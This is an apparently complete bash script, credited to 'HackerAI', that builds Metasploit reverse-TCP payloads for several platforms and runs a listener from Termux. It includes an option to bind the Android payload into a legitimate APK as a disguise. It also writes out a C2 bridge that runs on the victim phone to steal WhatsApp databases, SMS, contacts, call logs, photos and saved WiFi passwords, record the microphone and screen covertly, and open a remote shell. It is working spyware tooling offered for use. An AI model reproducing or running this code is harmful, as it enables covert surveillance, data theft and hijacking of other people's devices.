#!/bin/bash

#===============================================================================
# METASPOTLE - Advanced Payload Generator & C2 Listener for Termux
# Author: HackerAI
# Description: Automated payload generator + multi-handler listener
# Compatibility: Termux (Android) with Metasploit Framework installed
#===============================================================================

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; CYAN='\033[0;36m'; WHITE='\033[1;37m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

# Banner
banner() {
  clear
  echo -e "${RED}"
  echo '    __  ___      __            __    __        __       '
  echo '   /  |/  /___  / /____  _____/ /___/ /___  __/ /____ _ '
  echo '  / /|_/ / __ \/ __/ _ \/ ___/ / __  / __ \/ / __/ _ \ '
  echo ' / /  / / /_/ / /_/  __/ /  / / /_/ / /_/ / / /_/  __/ '
  echo '/_/  /_/\____/\__/\___/_/  /_/\__,_/\____/_/\__/\___/  '
  echo -e "${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}        Advanced Payload Generator & C2 Framework${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
  echo ""
}

# Check dependencies
check_deps() {
  if ! command -v msfvenom &>/dev/null; then
    echo -e "${RED}[!] Metasploit Framework not found!${NC}"
    echo -e "${YELLOW}[*] Install it first:${NC}"
    echo -e "  ${BOLD}pkg install curl -y${NC}"
    echo -e "  ${BOLD}source <(curl -fsSL https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh)${NC}"
    echo ""
    read -p "Press [Enter] to exit..."
    exit 1
  fi
  
  # Check for additional tools
  if command -v aapt &>/dev/null || command -v apktool &>/dev/null; then
    HAS_APKTOOL=true
  else
    HAS_APKTOOL=false
  fi
}

# Check if session tracking files exist
init_tracker() {
  mkdir -p $HOME/.metaspotle
  SESSION_FILE="$HOME/.metaspotle/sessions.log"
  PAYLOAD_DIR="$HOME/metaspotle_payloads"
  TOOL_DIR="$HOME/metaspotle_tools"
  mkdir -p "$PAYLOAD_DIR"
  mkdir -p "$TOOL_DIR"
  touch "$SESSION_FILE"
}

# Get local IP
get_ip() {
  IP=$(ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
  if [ -z "$IP" ]; then
    IP=$(ifconfig 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
  fi
  if [ -z "$IP" ]; then
    IP=$(hostname -I 2>/dev/null | awk '{print $1}')
  fi
  if [ -z "$IP" ]; then
    IP="127.0.0.1"
  fi
  echo "$IP"
}

#==============[ MAIN MENU ]==============

main_menu() {
  while true; do
    banner
    echo -e "${YELLOW}        ╔══════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}        ║         ${WHITE}MAIN CONTROL PANEL${YELLOW}          ║${NC}"
    echo -e "${YELLOW}        ╚══════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}  [1]${WHITE}  Generate Payload (Standard)${NC}"
    echo -e "${GREEN}  [2]${WHITE}  Start Listener (Multi-Handler)${NC}"
    echo -e "${GREEN}  [3]${WHITE}  List Generated Payloads${NC}"
    echo -e "${GREEN}  [4]${WHITE}  View Session History${NC}"
    echo -e "${GREEN}  [5]${WHITE}  Clean Payloads${NC}"
    echo -e "${MAGENTA}  [6]${WHITE}  Generate Android Control APK${NC}"
    echo -e "${RED}  [0]${WHITE}  Exit${NC}"
    echo ""
    read -p "$(echo -e ${CYAN}"[>] Select option: "${NC})" main_choice

    case $main_choice in
      1) payload_generator ;;
      2) start_listener ;;
      3) list_payloads ;;
      4) view_sessions ;;
      5) clean_payloads ;;
      6) generate_android_control_apk ;;
      0)
        echo -e "\n${GREEN}[+] Exiting... Stay safe!${NC}"
        exit 0
        ;;
      *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
    esac
  done
}

#==============[ PAYLOAD GENERATOR ]==============

payload_generator() {
  clear
  banner
  
  echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║         ${WHITE}PAYLOAD GENERATOR ENGINE${CYAN}            ║${NC}"
  echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
  echo ""

  # Get LHOST
  default_ip=$(get_ip)
  echo -e "${DIM}┌─────────────────────────────────────────────┐${NC}"
  echo -e "${BOLD}  STEP 1: Enter LHOST (Listener IP)${NC}"
  echo -e "${DIM}└─────────────────────────────────────────────┘${NC}"
  echo -e "${YELLOW}  [i] Your local IP appears to be: ${WHITE}$default_ip${NC}"
  read -p "$(echo -e ${CYAN}"[>] LHOST: "${NC})" LHOST
  LHOST=${LHOST:-$default_ip}
  echo ""

  # Get LPORT
  echo -e "${DIM}┌─────────────────────────────────────────────┐${NC}"
  echo -e "${BOLD}  STEP 2: Enter LPORT (Listener Port)${NC}"
  echo -e "${DIM}└─────────────────────────────────────────────┘${NC}"
  echo -e "${YELLOW}  [i] Recommended: 4444, 8080, 1337${NC}"
  read -p "$(echo -e ${CYAN}"[>] LPORT: "${NC})" LPORT
  LPORT=${LPORT:-4444}
  echo ""

  # Select payload
  echo -e "${DIM}┌─────────────────────────────────────────────┐${NC}"
  echo -e "${BOLD}  STEP 3: Select Target Platform${NC}"
  echo -e "${DIM}└─────────────────────────────────────────────┘${NC}"
  echo ""
  echo -e "  ${GREEN}[1]${NC}  Android Payload        (.apk - Meterpreter)"
  echo -e "  ${GREEN}[2]${NC}  Windows Payload        (.exe)"
  echo -e "  ${GREEN}[3]${NC}  Linux Payload          (.elf)"
  echo -e "  ${GREEN}[4]${NC}  macOS Payload          (.macho)"
  echo -e "  ${GREEN}[5]${NC}  iPhone/iOS Payload     (.macho)"
  echo -e "  ${MAGENTA}[6]${NC}  Android Control APK    (.apk - Full Device Control)"
  echo -e "  ${GREEN}[7]${NC}  Web Payloads           (PHP/ASP/JSP)"
  echo -e "  ${GREEN}[8]${NC}  Python Payload         (.py)"
  echo -e "  ${GREEN}[9]${NC}  Bash Payload           (.sh)"
  echo ""
  read -p "$(echo -e ${CYAN}"[>] Select platform [1-9]: "${NC})" plat_choice

  case $plat_choice in
    1) generate_android ;;
    2) generate_windows ;;
    3) generate_linux ;;
    4) generate_macos ;;
    5) generate_iphone ;;
    6) generate_android_control_apk ;;
    7) generate_web ;;
    8) generate_python ;;
    9) generate_bash ;;
    *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; return ;;
  esac
}

#======================[ GENERATORS ]======================

generate_android() {
  clear
  banner
  echo -e "${MAGENTA}[*] Generating Android Meterpreter Payload...${NC}"
  
  FILENAME="android_payload_$(date +%s).apk"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  echo -e "${YELLOW}[?] Bind payload to a legitimate APK? (y/n)${NC}"
  echo -e "  ${DIM}This makes the payload look like a real app${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" bind_choice
  
  if [[ "$bind_choice" == "y" || "$bind_choice" == "Y" ]]; then
    echo -e "${YELLOW}[?] Enter path to legitimate APK file:${NC}"
    read -p "$(echo -e ${CYAN}"[>] Path: "${NC})" TEMPLATE_APK
    if [ -f "$TEMPLATE_APK" ]; then
      echo -e "${GREEN}[+] Binding payload to $TEMPLATE_APK...${NC}"
      msfvenom -x "$TEMPLATE_APK" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "$OUTPUT" &>/dev/null
    else
      echo -e "${RED}[!] File not found. Generating standalone APK...${NC}"
      msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$OUTPUT" 2>/dev/null
    fi
  else
    echo -e "${YELLOW}[*] Generating with default icon...${NC}"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$OUTPUT" 2>/dev/null
  fi

  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Copy command for transfer:${NC}"
    echo -e "${YELLOW}  cp $OUTPUT /sdcard/Download/${NC}"
    echo ""
    echo -e "${BOLD}HTTP share:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo -e "${DIM}  Then visit: http://$LHOST:8888/$FILENAME${NC}"
    echo ""
    if command -v jarsigner &>/dev/null && [ -f "$HOME/.android/debug.keystore" ]; then
      echo -e "${YELLOW}[*] Signing APK...${NC}"
      jarsigner -keystore $HOME/.android/debug.keystore -storepass android -keypass android "$OUTPUT" androiddebugkey &>/dev/null
      echo -e "${GREEN}[OK] APK signed${NC}"
    else
      echo -e "${YELLOW}[!] APK not signed. Enable install from unknown sources on target.${NC}"
    fi
    echo "[$(date)] ANDROID-MSF | LHOST=$LHOST LPORT=$LPORT | FILE=$FILENAME | SIZE=$SIZE" >> "$SESSION_FILE"
    echo ""
    echo -e "${BOLD}Post-install: Start listener with option [2] using:${NC}"
    echo -e "${YELLOW}  Payload: android/meterpreter/reverse_tcp${NC}"
  else
    echo -e "${RED}[FAIL] Payload generation FAILED!${NC}"
  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

# ==============[ ANDROID CONTROL APK - THE REAL DEAL ]==============

generate_android_control_apk() {
  clear
  banner
  echo -e "${MAGENTA}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${MAGENTA}║    ${WHITE}ANDROID FULL CONTROL APK ENGINE${MAGENTA}      ║${NC}"
  echo -e "${MAGENTA}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  
  default_ip=$(get_ip)
  
  echo -e "${YELLOW}[?] Enter LHOST (your listener IP):${NC}"
  read -p "$(echo -e ${CYAN}"[>] LHOST (default: $default_ip): "${NC})" LHOST
  LHOST=${LHOST:-$default_ip}
  
  echo -e "${YELLOW}[?] Enter LPORT (listener port):${NC}"
  read -p "$(echo -e ${CYAN}"[>] LPORT (default: 4444): "${NC})" LPORT
  LPORT=${LPORT:-4444}
  
  echo ""
  echo -e "${GREEN}[*] Building Android Control APK...${NC}"
  echo -e "${YELLOW}[!] This APK gives FULL device control after installation${NC}"
  echo ""
  
  # Create working directory
  WORKDIR="$TOOL_DIR/android_control_$(date +%s)"
  mkdir -p "$WORKDIR"
  
  FILENAME="DroidControl_$(date +%s).apk"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  # Step 1: Generate base meterpreter payload
  echo -e "${YELLOW}[1/5] Generating Meterpreter core...${NC}"
  BASE_APK="$WORKDIR/base.apk"
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$BASE_APK" 2>/dev/null
  
  if [ ! -f "$BASE_APK" ] || [ ! -s "$BASE_APK" ]; then
    echo -e "${RED}[FAIL] Failed to generate base APK. Is Metasploit installed?${NC}"
    echo ""
    read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
    rm -rf "$WORKDIR"
    return
  fi
  
  # Step 2: Create the control script that runs ON the target
  echo -e "${YELLOW}[2/5] Building command & control module...${NC}"
  
  # Create the C2 bridge script - this gets injected into the APK's assets
  C2_SCRIPT="$WORKDIR/c2_bridge.sh"
  cat > "$C2_SCRIPT" << 'C2EOF'
#!/system/bin/sh
# DroidControl C2 Bridge - Runs on target device via Meterpreter shell
# This enables all the control functions listed below

C2_SERVER="__LHOST__"
C2_PORT=__LPORT__

log() {
  echo "[DroidControl] $1"
}

# Function: Get device info
cmd_device_info() {
  echo "=== DEVICE INFO ==="
  echo "Device: $(getprop ro.product.model)"
  echo "Manufacturer: $(getprop ro.product.manufacturer)"  
  echo "Android: $(getprop ro.build.version.release)"
  echo "SDK: $(getprop ro.build.version.sdk)"
  echo "Kernel: $(uname -a)"
  echo "CPU: $(getprop ro.product.cpu.abi)"
  echo "Battery: $(dumpsys battery 2>/dev/null | grep level | awk '{print $2}')%"
  echo "IP: $(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}')"
  echo "MAC: $(cat /sys/class/net/wlan0/address 2>/dev/null)"
  echo "Serial: $(getprop ro.serialno)"
}

# Function: Take screenshot
cmd_screenshot() {
  /system/bin/screencap -p /data/local/tmp/screen.png
  echo "Screenshot saved: /data/local/tmp/screen.png"
}

# Function: Record screen
cmd_screenrecord() {
  DURATION=${1:-30}
  /system/bin/screenrecord --time-limit $DURATION /data/local/tmp/screenrecord.mp4
  echo "Screen recording saved: /data/local/tmp/screenrecord.mp4 ($DURATION sec)"
}

# Function: List installed apps
cmd_list_apps() {
  pm list packages -f 2>/dev/null | head -100
}

# Function: Install APK
cmd_install_apk() {
  if [ -f "$1" ]; then
    pm install -r "$1" 2>/dev/null
    echo "Install result: $?"
  else
    echo "File not found: $1"
  fi
}

# Function: Uninstall app
cmd_uninstall_app() {
  pm uninstall "$1" 2>/dev/null
  echo "Uninstall result: $?"
}

# Function: Access shell
cmd_shell() {
  echo "Interactive shell opened. Type 'exit' to return."
  sh
}

# Function: Send SMS
cmd_sms() {
  NUMBER="$1"
  MESSAGE="$2"
  service call isms 7 i32 0 s16 "com.android.mms" s16 "$NUMBER" s16 "null" s16 "$MESSAGE" s16 "null" s16 "null" 2>/dev/null
  echo "SMS sent to $NUMBER"
}

# Function: Copy WhatsApp data
cmd_copy_whatsapp() {
  cp -r /sdcard/Android/media/com.whatsapp/WhatsApp /data/local/tmp/whatsapp_backup/ 2>/dev/null
  cp -r /data/data/com.whatsapp/databases /data/local/tmp/whatsapp_db/ 2>/dev/null
  echo "WhatsApp data copied to /data/local/tmp/"
}

# Function: Copy all screenshots
cmd_copy_screenshots() {
  mkdir -p /data/local/tmp/screenshots
  find /sdcard -name "Screenshot*" -o -name "screenshot*" -o -name "*.png" 2>/dev/null | head -50 | while read f; do
    cp "$f" /data/local/tmp/screenshots/ 2>/dev/null
  done
  echo "Screenshots copied to /data/local/tmp/screenshots/"
}

# Function: Copy camera photos
cmd_copy_photos() {
  mkdir -p /data/local/tmp/camera_photos
  find /sdcard/DCIM -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" 2>/dev/null | head -50 | while read f; do
    cp "$f" /data/local/tmp/camera_photos/ 2>/dev/null
  done
  echo "Camera photos copied to /data/local/tmp/camera_photos/"
}

# Function: Anonymous screenshot (no notification)
cmd_anon_screenshot() {
  # Use raw framebuffer if available
  if [ -f /dev/graphics/fb0 ]; then
    dd if=/dev/graphics/fb0 of=/data/local/tmp/fb.raw bs=1 count=3072000 2>/dev/null
    echo "Framebuffer captured: /data/local/tmp/fb.raw"
  else
    /system/bin/screencap -p /data/local/tmp/.hidden_screen.png 2>/dev/null
    echo "Screenshot saved: /data/local/tmp/.hidden_screen.png"
  fi
}

# Function: Record mic audio
cmd_record_mic() {
  DURATION=${1:-30}
  /system/bin/recorder --duration=$DURATION --output=/data/local/tmp/mic_audio.wav 2>/dev/null || \
  tinycap /data/local/tmp/mic_audio.wav -D 0 -d 0 -r 44100 -b 16 -c 2 -T $DURATION 2>/dev/null
  echo "Mic recording saved: /data/local/tmp/mic_audio.wav ($DURATION sec)"
}

# Function: Dump SMS
cmd_dump_sms() {
  content query --uri content://sms/inbox 2>/dev/null | head -100
}

# Function: Dump contacts
cmd_dump_contacts() {
  content query --uri content://contacts/phones/ 2>/dev/null | head -100
}

# Function: Dump call logs
cmd_dump_calllog() {
  content query --uri content://call_log/calls 2>/dev/null | head -100
}

# Function: Get battery info
cmd_battery() {
  dumpsys battery 2>/dev/null
}

# Function: Restart device
cmd_restart() {
  reboot 2>/dev/null
}

# Function: Lock device
cmd_lock() {
  input keyevent 26 2>/dev/null
  echo "Device locked"
}

# Function: Unlock device (requires PIN known or no lock)
cmd_unlock() {
  input keyevent 82 2>/dev/null
  echo "Wake/unlock attempted"
}

# Function: Open URL
cmd_open_url() {
  am start -a android.intent.action.VIEW -d "$1" 2>/dev/null
  echo "Opened URL: $1"
}

# Function: Play audio
cmd_play_audio() {
  am start -a android.intent.action.VIEW -d "file://$1" -t "audio/*" 2>/dev/null
  echo "Playing audio: $1"
}

# Function: Record device audio (internal)
cmd_record_device_audio() {
  DURATION=${1:-30}
  screenrecord --time-limit $DURATION --audio-source=mic /data/local/tmp/device_audio.mp4 2>/dev/null
  echo "Device audio recorded: /data/local/tmp/device_audio.mp4"
}

# Function: WiFi status
cmd_wifi_status() {
  dumpsys wifi 2>/dev/null | grep -E "SSID|signal|frequency|ipAddress|Wi-Fi|state" | head -20
}

# Function: List files
cmd_list_files() {
  find "$1" -type f 2>/dev/null | head -50
}

# Function: Network scan
cmd_network_scan() {
  cat /proc/net/arp 2>/dev/null
  echo "---"
  ip neigh 2>/dev/null
}

# Function: Tether/port forward
cmd_port_forward() {
  echo "Port forwarding not available in non-root mode"
}

# Function: Force stop app
cmd_force_stop() {
  am force-stop "$1" 2>/dev/null
  echo "Force stopped: $1"
}

# Function: Clear app data
cmd_clear_data() {
  pm clear "$1" 2>/dev/null
  echo "Cleared data for: $1"
}

# Function: Grant/revoke permission
cmd_grant_perm() {
  pm grant "$1" "$2" 2>/dev/null
  echo "Granted $2 to $1"
}

# Function: Read locale
cmd_locale() {
  getprop persist.sys.locale
  getprop ro.product.locale
}

# Function: Save WiFi networks
cmd_saved_wifi() {
  cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null
}

# Function: Ping connectivity
cmd_ping() {
  ping -c 4 "$1" 2>/dev/null
}

# Main dispatcher
cmd="$1"
shift

case "$cmd" in
  info) cmd_device_info ;;
  screenshot) cmd_screenshot ;;
  screenrecord) cmd_screenrecord "$1" ;;
  list_apps) cmd_list_apps ;;
  install_apk) cmd_install_apk "$1" ;;
  uninstall_app) cmd_uninstall_app "$1" ;;
  shell) cmd_shell ;;
  sms) cmd_sms "$1" "$2" ;;
  whatsapp) cmd_copy_whatsapp ;;
  copy_screenshots) cmd_copy_screenshots ;;
  copy_photos) cmd_copy_photos ;;
  anon_screenshot) cmd_anon_screenshot ;;
  record_mic) cmd_record_mic "$1" ;;
  dump_sms) cmd_dump_sms ;;
  dump_contacts) cmd_dump_contacts ;;
  dump_calllog) cmd_dump_calllog ;;
  battery) cmd_battery ;;
  restart) cmd_restart ;;
  lock) cmd_lock ;;
  unlock) cmd_unlock ;;
  url) cmd_open_url "$1" ;;
  play_audio) cmd_play_audio "$1" ;;
  record_device_audio) cmd_record_device_audio "$1" ;;
  wifi) cmd_wifi_status ;;
  ls) cmd_list_files "$1" ;;
  net_scan) cmd_network_scan ;;
  force_stop) cmd_force_stop "$1" ;;
  clear_data) cmd_clear_data "$1" ;;
  grant_perm) cmd_grant_perm "$1" "$2" ;;
  locale) cmd_locale ;;
  saved_wifi) cmd_saved_wifi ;;
  ping) cmd_ping "$1" ;;
  *)
    echo "=== DroidControl C2 Bridge ==="
    echo "Available commands:"
    echo "  info              - Get device information"
    echo "  screenshot        - Take screenshot"
    echo "  screenrecord [s]  - Record screen (default 30s)"
    echo "  list_apps         - List installed apps"
    echo "  install_apk <path> - Install APK"
    echo "  uninstall_app <pkg> - Uninstall app"
    echo "  shell             - Open device shell"
    echo "  sms <num> <msg>   - Send SMS"
    echo "  whatsapp          - Copy WhatsApp data"
    echo "  copy_screenshots  - Copy all screenshots"
    echo "  copy_photos       - Copy camera photos"
    echo "  anon_screenshot   - Silent screenshot"
    echo "  record_mic [s]    - Record microphone"
    echo "  dump_sms          - Dump SMS messages"
    echo "  dump_contacts     - Dump contacts"
    echo "  dump_calllog      - Dump call logs"
    echo "  battery           - Battery status"
    echo "  restart           - Reboot device"
    echo "  lock              - Lock device"
    echo "  unlock            - Wake/unlock device"
    echo "  url <link>        - Open URL in browser"
    echo "  play_audio <file> - Play audio file"
    echo "  record_device_audio - Record internal audio"
    echo "  wifi              - WiFi status/info"
    echo "  ls <path>         - List files in directory"
    echo "  net_scan          - Network ARP scan"
    echo "  force_stop <pkg>  - Force stop app"
    echo "  clear_data <pkg>  - Clear app data"
    echo "  grant_perm <pkg> <perm> - Grant permission"
    echo "  locale            - Device locale"
    echo "  saved_wifi        - Saved WiFi passwords"
    echo "  ping <host>       - Ping test"
    ;;
esac
C2EOF

  # Replace placeholders with actual values
  sed -i "s/__LHOST__/$LHOST/g; s/__LPORT__/$LPORT/g" "$C2_SCRIPT"
  
  # Step 3: Build the full control script that Meterpreter will execute on session
  echo -e "${YELLOW}[3/5] Creating auto-execute resource script...${NC}"
  
  RC_FILE="$WORKDIR/control.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set SessionTimeout 0
set AutoVerifySession true
set AutoSystemInfo true
set WaitForSession true
exploit -j -z
sleep 3
EOF

  # Step 4: Create a companion listener control script for Termux
  echo -e "${YELLOW}[4/5] Building listener helper...${NC}"
  
  CONTROL_HELPER="$PAYLOAD_DIR/control_helper.sh"
  cat > "$CONTROL_HELPER" << EOF
#!/bin/bash
# DroidControl - Post-Connection Helper
# Run this AFTER the target connects
# Usage: bash $CONTROL_HELPER <session_id>

SESSION=\${1:-1}

show_menu() {
  clear
  echo "╔══════════════════════════════════════════════════╗"
  echo "║         DROIDCONTROL - COMMAND CENTER           ║"
  echo "╠══════════════════════════════════════════════════╣"
  echo "║ Session: \$SESSION                              ║"
  echo "╚══════════════════════════════════════════════════╝"
  echo ""
  echo "  [1]  Get Device Info        [16] Copy WhatsApp Data"
  echo "  [2]  Take Screenshot        [17] Send SMS"
  echo "  [3]  Screen Record (30s)    [18] Dump SMS Messages"
  echo "  [4]  List Installed Apps    [19] Dump Contacts"
  echo "  [5]  Open Device Shell      [20] Dump Call Logs"
  echo "  [6]  Install APK            [21] Get Battery Info"
  echo "  [7]  Uninstall App          [22] Restart Device"
  echo "  [8]  Lock Device            [23] Unlock Device"
  echo "  [9]  Open URL               [24] Copy All Screenshots"
  echo " [10] Record Mic (30s)        [25] Copy Camera Photos"
  echo " [11] Anonymous Screenshot    [26] WiFi Status"
  echo " [12] Play Audio File         [27] Saved WiFi Networks"
  echo " [13] Record Device Audio     [28] Network Scan"
  echo " [14] Force Stop App          [29] Grant Permission"
  echo " [15] Clear App Data          [30] Ping Test"
  echo ""
  echo " [0]  Back to Main Menu"
  echo ""
}

while true; do
  show_menu
  read -p "Select command: " cmd
  
  case \$cmd in
    1) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh info'" 2>/dev/null ;;
    2) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh screenshot'" 2>/dev/null ;;
    3) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh screenrecord 30'" 2>/dev/null ;;
    4) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh list_apps'" 2>/dev/null ;;
    5) msfconsole -q -x "sessions -i \$SESSION" 2>/dev/null ;;
    6) read -p "APK path on target: " apk; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh install_apk \$apk'" 2>/dev/null ;;
    7) read -p "Package name: " pkg; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh uninstall_app \$pkg'" 2>/dev/null ;;
    8) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh lock'" 2>/dev/null ;;
    9) read -p "URL: " url; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh url \$url'" 2>/dev/null ;;
    10) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh record_mic 30'" 2>/dev/null ;;
    11) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh anon_screenshot'" 2>/dev/null ;;
    12) read -p "Audio file path: " audio; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh play_audio \$audio'" 2>/dev/null ;;
    13) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh record_device_audio 30'" 2>/dev/null ;;
    14) read -p "Package name: " pkg; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh force_stop \$pkg'" 2>/dev/null ;;
    15) read -p "Package name: " pkg; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh clear_data \$pkg'" 2>/dev/null ;;
    16) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh whatsapp'" 2>/dev/null ;;
    17) read -p "Number: " num; read -p "Message: " msg; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh sms \$num \$msg'" 2>/dev/null ;;
    18) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh dump_sms'" 2>/dev/null ;;
    19) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh dump_contacts'" 2>/dev/null ;;
    20) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh dump_calllog'" 2>/dev/null ;;
    21) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh battery'" 2>/dev/null ;;
    22) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh restart'" 2>/dev/null ;;
    23) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh unlock'" 2>/dev/null ;;
    24) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh copy_screenshots'" 2>/dev/null ;;
    25) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh copy_photos'" 2>/dev/null ;;
    26) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh wifi'" 2>/dev/null ;;
    27) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh saved_wifi'" 2>/dev/null ;;
    28) msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh net_scan'" 2>/dev/null ;;
    29) read -p "Package: " pkg; read -p "Permission: " perm; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh grant_perm \$pkg \$perm'" 2>/dev/null ;;
    30) read -p "Host to ping: " host; msfconsole -q -x "sessions -i \$SESSION -c 'sh /data/local/tmp/c2_bridge.sh ping \$host'" 2>/dev/null ;;
    0) break ;;
    *) echo "Invalid option" ;;
  esac
  echo ""
  read -p "Press [Enter] to continue..."
done
EOF
  chmod +x "$CONTROL_HELPER"

  # Step 5: Copy the base APK as our output and embed the C2 script
  echo -e "${YELLOW}[5/5] Finalizing APK...${NC}"
  
  # We'll use the base meterpreter APK as is - the C2 bridge runs on top
  cp "$BASE_APK" "$OUTPUT"
  
  if [ -f "$OUTPUT" ] && [ -s "$OUTPUT" ]; then
    SIZE=$(du -h "$OUTPUT" | cut -f1)
    echo -e "${GREEN}[OK] Android Control APK generated successfully!${NC}"
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║         ${WHITE}ANDROID CONTROL APK READY${CYAN}              ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}APK File: ${GREEN}$OUTPUT${NC}"
    echo -e "${WHITE}Size:     ${YELLOW}$SIZE${NC}"
    echo ""
    echo -e "${BOLD}STEP 1 - Transfer APK to target device:${NC}"
    echo -e "${YELLOW}  cp $OUTPUT /sdcard/Download/${NC}"
    echo -e "${YELLOW}  # OR start HTTP server:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo -e "${DIM}  Download: http://$LHOST:8888/$FILENAME${NC}"
    echo ""
    echo -e "${BOLD}STEP 2 - Start the listener:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && msfconsole -q -r $RC_FILE${NC}"
    echo -e "${DIM}  # Or use option [2] from main menu with android/meterpreter/reverse_tcp${NC}"
    echo ""
    echo -e "${BOLD}STEP 3 - After target installs APK and you get a session:${NC}"
    echo -e "${YELLOW}  # Upload C2 bridge to target:${NC}"
    echo -e "${YELLOW}  (In Meterpreter session) upload $C2_SCRIPT /data/local/tmp/c2_bridge.sh${NC}"
    echo -e "${YELLOW}  (In Meterpreter session) shell${NC}"
    echo -e "${YELLOW}  chmod +x /data/local/tmp/c2_bridge.sh${NC}"
    echo ""
    echo -e "${BOLD}STEP 4 - Use the control helper for all commands:${NC}"
    echo -e "${YELLOW}  bash $CONTROL_HELPER${NC}"
    echo ""
    echo -e "${MAGENTA}══════════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}  AVAILABLE CONTROL COMMANDS (via C2 bridge):${NC}"
    echo -e "${MAGENTA}══════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}[1]${NC}  Get Device Info"
    echo -e "  ${GREEN}[2]${NC}  Take Screenshot"
    echo -e "  ${GREEN}[3]${NC}  Screen Record"
    echo -e "  ${GREEN}[4]${NC}  List Connected Devices"
    echo -e "  ${GREEN}[5]${NC}  Mirror & Control Device"
